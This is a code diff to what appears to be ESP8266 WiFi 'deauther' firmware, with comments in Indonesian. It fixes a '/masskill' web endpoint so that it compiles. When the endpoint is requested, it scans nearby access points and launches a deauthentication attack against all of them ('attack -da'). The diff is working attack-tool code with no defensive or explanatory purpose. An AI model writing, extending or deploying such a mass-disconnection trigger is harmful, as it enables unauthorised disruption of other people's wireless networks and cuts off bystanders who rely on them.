@@ -54,7 +54,7 @@ int indikator_nyala = NYALA;
 int delay_strobe = 100;
         
 void setup() {
-  String macc = WiFi.macAddress();
+    String macc = WiFi.macAddress();
     EEPROMHelper::begin(EEPROM_SIZE);
     #ifdef DEFAULT_ESP8266
     pinMode(STROBE,OUTPUT);
@@ -128,18 +128,18 @@ void setup() {
         Serial.end();
     }
 
-    // --- FIX MASS KILL: Panggil server langsung dari namespace wifi ---
+    // --- FIX FINAL MASS KILL: Pakai metode getWebServer() ---
     if (settings::getWebSettings().enabled) {
         wifi::startAP();
         
-        // Memasukkan handler masskill ke server yang ada di wifi.cpp
-        wifi::server.on("/masskill", []() {
+        // Panggil pointer server secara dinamis agar tidak error linker
+        wifi::getWebServer()->on("/masskill", []() {
             attack.stop();
             scan.stop();
             accesspoints.removeAll();
-            cli.runCommand("scan aps -t 15s"); //
-            cli.runCommand("attack -da");      //
-            wifi::server.send(200, "text/plain", "OK");
+            cli.runCommand("scan aps -t 15s");
+            cli.runCommand("attack -da");
+            wifi::getWebServer()->send(200, "text/plain", "OK");
         });
     }
 
